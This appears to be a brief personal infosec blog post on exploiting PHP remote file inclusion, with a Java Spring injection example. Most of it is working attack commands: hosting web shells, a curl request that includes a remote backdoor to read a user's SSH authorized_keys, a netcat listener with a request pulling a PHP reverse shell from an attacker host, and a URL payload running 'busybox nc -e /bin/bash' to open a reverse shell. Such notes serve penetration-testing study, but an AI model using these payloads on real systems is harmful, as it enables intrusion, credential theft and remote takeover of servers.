---
layout: post
title: Remote File Inclusion - PHP Web Shells
titledate: 08/30/23
tags: ["infosec","offsec", "web", "rfi", "exploit", "php", "shell", "http"]
---

for RFI vulns just like the php data:// wrapper the allow_url_include option must be enabled in teh php web application

rfi vulns allow us to include files over http or smb 

<h3>/usr/share/webshells</h3>

there are plenty of good shells out there that can also be included from online hosted repos

in this example, we will host a webshell on our own web server that creates a backdoor, as state above, we could point to one that is hosted online

    $ /usr/share/webshells/php/python3 -m http.server 80

now we can point to the hosted webshell to execute our command

    $ curl "http://vulnapp.com/home/index.php?page=http://192.168.1.1/simple-backdoor.php&cmd=cat%20/home/don/.ssh/authorized_keys"

and we can utilise the same functionality to establish a reverse shell by utilizing a reverse shell php script

    $ /usr/share/webshells/php/python3 -m http.server 80

start the web server hosting our script

    $ nc -nlvp 443

    $ curl "http://vulnapp.com/home/index.php?page=http://192.168.1.1/php-reverse-shell.php" 

#### java spring vuln

    http://booger.com:8080/search?query=$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27busybox%20nc%20192.168.10.210%204444%20-e%20/bin/bash%27)%7D

